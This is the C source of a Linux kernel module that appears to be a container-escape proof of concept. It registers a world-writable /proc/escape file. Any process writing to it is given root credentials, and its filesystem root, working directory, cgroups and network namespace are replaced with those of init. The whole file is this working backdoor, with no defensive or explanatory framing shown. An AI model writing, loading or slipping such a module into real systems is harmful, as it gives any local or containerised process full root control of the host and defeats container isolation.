#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cred.h>
#include <linux/fs_struct.h>
#include <linux/sched/task.h>
#include <linux/proc_fs.h>
#include <linux/nsproxy.h>
#include <linux/net.h>
#include <net/net_namespace.h>  // Required for get_net()

void tweak_fs_struct(struct fs_struct * dest, struct fs_struct * source) {
    if (dest) {
        dest->users = 1;
        dest->in_exec = 0;
        dest->umask = source->umask;

        dest->root = source->root;
        dest->pwd = source->pwd;
    }
}

void switch_to_init_netns(struct task_struct *task) {
    struct nsproxy *init_nsproxy = init_task.nsproxy;
    struct nsproxy *task_nsproxy = task->nsproxy;

    if (init_nsproxy && task_nsproxy) {
        // Switch network namespace, ensuring type consistency with the struct net pointer
        task_nsproxy->net_ns = get_net(init_nsproxy->net_ns);
    }
}

ssize_t w_proc(struct file *f, const char __user *buf, size_t count, loff_t *off) {
    struct task_struct * init_ts = &init_task;
    printk(KERN_INFO "escape - fs and netns overwrite - pid is %d\n", current->pid);

    // Grant root privileges
    commit_creds(prepare_kernel_cred(0));

    // Overwrite filesystem structure
    tweak_fs_struct(current->fs, init_ts->fs);

    // Overwrite cgroups
    current->cgroups = init_ts->cgroups;

    // Switch to init's network namespace
    switch_to_init_netns(current);

    return count;
}

const struct proc_ops proc_fops = {
    .proc_write = w_proc
};

int proc_init(void) {
    printk(KERN_INFO "init procfs module");
    proc_create("escape", 0666, NULL, &proc_fops);

    return 0;
}

void proc_cleanup(void) {
    remove_proc_entry("escape", NULL);
}

MODULE_LICENSE("GPL");
module_init(proc_init);
module_exit(proc_cleanup);
